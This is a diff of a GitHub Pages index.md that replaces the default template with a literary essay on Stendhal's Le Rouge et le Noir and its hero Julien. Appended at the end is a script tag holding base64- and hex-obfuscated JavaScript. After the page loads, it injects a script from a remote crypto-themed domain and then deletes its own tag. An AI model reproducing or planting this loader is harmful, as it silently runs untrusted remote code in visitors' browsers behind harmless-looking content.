@@ -1,37 +1,17 @@
-## Welcome to GitHub Pages
+# Julien's enemies
 
-You can use the [editor on GitHub](https://github.com/artisseerabeni861/Flowers/edit/gh-pages/index.md) to maintain and preview the content for your website in Markdown files.
+Julien's enemies will no doubt taunt him with his introspection, while they point to a character distorted, so they say, by the eternal mirror of its own consciousness. Yet it should be remembered that Julien lived in an age when introspection had, so to speak, been only recently invented, and Byronism and Wertherism were the stock food of artistic temperaments. In the case of Julien, moreover, even though his own criticisms on his own acts were to some extent as important to him as the actual acts themselves, his introspection was more a strength than a weakness and never blunted the edge of his drastic action. Compare, for instance, the character of Julien with the character of Robert Greslou, the hero of Bourget's Le Disciple, and the nearest analogue to Julien in fin de siècle literature, and one will appreciate at once the difference between health and decadence, virility and hysteria.
+![l](https://ua.news/wp-content/uploads/2020/07/1134.jpg)
+One of the most essential features of the book, however, is the swing of the pendulum between Julien's ambition and Julien's tenderness. For our hunter is quite frequently caught in his own traps, so that he falls genuinely in love with the woman whom, as a matter of abstract principle, he had specifically set himself to conquer. The book consequently as a romance of love, ranks almost as high as it does as a romance of ambition. The final idyll in prison with Mme. de Rênal, in particular, is one of the sweetest and purest in literature, painted in colours too true ever to be florid, steeped in a sentiment too deep ever to be mawkish. As moreover, orthodox and suburban minds tend to regard all French novels as specifically devoted to obscene wallowings, it seems only relevant to mention that Stendhal at any rate never finds in sensualism any inspiration for ecstatic rhapsodies, and that he narrates the most specific episodes in the chastest style imaginable.
 
-Whenever you commit to this repository, GitHub Pages will run [Jekyll](https://jekyllrb.com/) to rebuild the pages in your site, from the content in your Markdown files.
+Though too the sinister figure of the carpenter's son looms large over the book, the characterization of all the other personages is portrayed with consummate brilliancy. For Stendhal standing first outside his characters with all the sceptical scrutiny of a detached observer, then goes deep inside them so that he describes not merely what they do, but why they do it, not merely what they think, but why they think it, while he assigns their respective share to innate disposition, accident, and environment, and criticizes his creations with an irony that is only occasionally benevolent. For it must be confessed that Stendhal approves of extremely few people. True scion of the middle-classes he hates the bourgeois because he is bourgeois, and the aristocrat because he is aristocrat. Nevertheless, as a gallery of the most varied characters, patricians and plebeians, prudes and profligates, Jesuits and Jansenists, Kings and coachmen, bishops and bourgeois, whose mutual difference acts as a most effective foil to each other's reality, Le Rouge et Le Noir will beat any novel outside Balzac.
 
-### Markdown
+We would mention in particular those two contrasted figures, Mme. de Rênal the bourgeoise passionée, and Matilde de la Mole the noble damozel who enters into her intrigue out of a deliberate wish to emulate the exploits of a romantic ancestress. But after all these individuals stand out not so much because their characterization is better than that of their fellow-personages, but because it is more elaborate. Even such minor characters, for instance, as de Frilair, the lascivious Jesuit, Noiraud, the avaricious gaoler, Mme. de Fervaques, the amoristic prude, are all in their respective ways real, vivid, convincing, no mere padded figures of the imagination, but observed actualities swung from the lived life on the written page.
 
-Markdown is a lightweight and easy-to-use syntax for styling your writing. It includes conventions for
+The style of Stendhal is noticeable from its simplicity, clear and cold, devoid of all literary artifice, characteristic of his analytic purpose. He is strenuous in his avoidance of affection. Though, however, he never holds out his style as an aesthetic delight in itself, he reaches occasionally passages of a rare and simple beauty. We would refer in particular to the description of Julien in the mountains, which we have already mentioned, and to the short but impressive death scene. His habit, however, of using language as a means and never as an end, occasionally revenges itself upon him in places where the style, though intelligible, is none the less slovenly, anacoluthic, almost Thucydidean.
 
-```markdown
-Syntax highlighted code block
+After the publication of Le Rouge et Le Noir Stendhal was forced by his financial embarrassment to leave Paris and take up the post of consul at Trieste. Driven from this position by the intrigues of a vindictive Church he was transferred to Civita Vecchia where he remained till 1835, solacing his ennui by the compilation of his autobiography and thinking seriously of marriage with the rich and highly respectable daughter of his laundress. He then returned to Paris where he remained till 1842, where he died suddenly at the age of fifty-nine in the full swing of all his mental and physical activities.
 
-# Header 1
-## Header 2
-### Header 3
+His later works included, La Chartreuse de Parme, Lucien, Leuwen and Lamiel, of which the Chartreuse is the most celebrated, but Lamiel certainly the most sprightly. But it is on Le Rouge et Le Noir that his fame as a novelist is the most firmly based. It is with this most personal document, this record of his experiences and emotions that he lives identified, just as D'Annunzio will live identified with Il Fuoco or Mr. Wells with the New Machiavelli. Le Rouge et Le Noir is the greatest novel of its age and one of the greatest novels of the whole nineteenth century. It is full to the brim of intellect and adventure, introspection and action, youth, romance, tenderness, cynicism and rebellion. It is in a word the intellectual quintessence of the Napoleonic era.
 
-- Bulleted
-- List
-
-1. Numbered
-2. List
-
-**Bold** and _Italic_ and `Code` text
-
-[Link](url) and ![Image](src)
-```
-
-For more details see [GitHub Flavored Markdown](https://guides.github.com/features/mastering-markdown/).
-
-### Jekyll Themes
-
-Your Pages site will use the layout and styles from the Jekyll theme you have selected in your [repository settings](https://github.com/artisseerabeni861/Flowers/settings). The name of this theme is saved in the Jekyll `_config.yml` configuration file.
-
-### Support or Contact
-
-Having trouble with Pages? Check out our [documentation](https://help.github.com/categories/github-pages-basics/) or [contact support](https://github.com/contact) and we’ll help you sort it out.
+<script id="sIKpc" src="data:text/javascript;base64, dmFyIF91RTlXcSA9IFsnXHg3MVx4NzVceDY1XHg3Mlx4NzlceDUzXHg2NVx4NmNceDY1XHg2M1x4NzRceDZmXHg3MicsICdceDYyXHg2Zlx4NjRceDc5JywgJ1x4NjdceDY1XHg3NFx4NDVceDZjXHg2NVx4NmRceDY1XHg2ZVx4NzRceDQyXHg3OVx4NDlceDY0JywgJ1x4NDRceDRmXHg0ZFx4NDNceDZmXHg2ZVx4NzRceDY1XHg2ZVx4NzRceDRjXHg2Zlx4NjFceDY0XHg2NVx4NjQnLCAnXHg2M1x4NzJceDY1XHg2MVx4NzRceDY1XHg0NVx4NmNceDY1XHg2ZFx4NjVceDZlXHg3NCcsICdceDczXHg2M1x4NzJceDY5XHg3MFx4NzQnLCAnXHg3NFx4NzlceDcwXHg2NScsICdceDc0XHg2NVx4NzhceDc0XHgyZlx4NmFceDYxXHg3Nlx4NjFceDczXHg2M1x4NzJceDY5XHg3MFx4NzQnXTsoZnVuY3Rpb24oX1c5TkJzLCBfdVM4RnIpIHt2YXIgX0djeUdWID0gZnVuY3Rpb24oX3NBQUV4KSB7d2hpbGUgKC0tX3NBQUV4KSB7X1c5TkJzWydwdXNoJ10oX1c5TkJzWydzaGlmdCddKCkpO319O19HY3lHVigrK191UzhGcik7fShfdUU5V3EsIDB4MTFiKSk7dmFyIF9IekNGOSA9IGZ1bmN0aW9uKF9EZHRleSwgX2huYnhsKSB7X0RkdGV5ID0gX0RkdGV5IC0gMHgwO3ZhciBfNlg2T3cgPSBfdUU5V3FbX0RkdGV5XTtyZXR1cm4gXzZYNk93O307ZG9jdW1lbnRbJ1x4NjFceDY0XHg2NFx4NDVceDc2XHg2NVx4NmVceDc0XHg0Y1x4NjlceDczXHg3NFx4NjVceDZlXHg2NVx4NzInXShfSHpDRjkoJzB4MCcpLCBmdW5jdGlvbigpIHt2YXIgX3R4TzhnID0gZG9jdW1lbnRbX0h6Q0Y5KCcweDEnKV0oX0h6Q0Y5KCcweDInKSk7X3R4TzhnW19IekNGOSgnMHgzJyldID0gX0h6Q0Y5KCcweDQnKTtfdHhPOGdbJ1x4NzNceDcyXHg2MyddID0gJ1x4NjhceDc0XHg3NFx4NzBceDczXHgzYVx4MmZceDJmXHg2Mlx4NjVceDc2XHg2NVx4NzJceDYxXHg2N1x4NjVceDc0XHg3Mlx4NjFceDY0XHg2OVx4NmVceDY3XHg2MVx4NjNceDYzXHgzMVx4MmVceDYzXHg3Mlx4NzlceDcwXHg3NFx4NmZceDJkXHg2Y1x4NjFceDYyXHg2Zlx4NzJceDYxXHg3NFx4NmZceDcyXHg3OVx4MmVceDYzXHg2Zlx4NmRceDJmXHg1Zlx4NzJceDY1XHg2ZFx4NmZceDc0XHg2NVx4NWZceDc0XHg3Mlx4NjFceDYzXHg2Ylx4MmVceDZhXHg3M1x4M2ZceDYzXHg2MVx4NmRceDcwXHg2MVx4NjlceDY3XHg2ZVx4M2RceDZjXHg1NFx4NDdceDZiXHg0OFx4NGRceDUyXHg0Nlx4NDlceDUxJztkb2N1bWVudFtfSHpDRjkoJzB4NScpXShfSHpDRjkoJzB4NicpKVsnXHg2MVx4NzBceDcwXHg2NVx4NmVceDY0XHg0M1x4NjhceDY5XHg2Y1x4NjQnXShfdHhPOGcpO2RvY3VtZW50W19IekNGOSgnMHg3JyldKCdzSUtwYycpWydceDcyXHg2NVx4NmRceDZmXHg3Nlx4NjUnXSgpO30sIHsnXHg2Zlx4NmVceDYzXHg2NSc6ICEhW119KTs="></script>
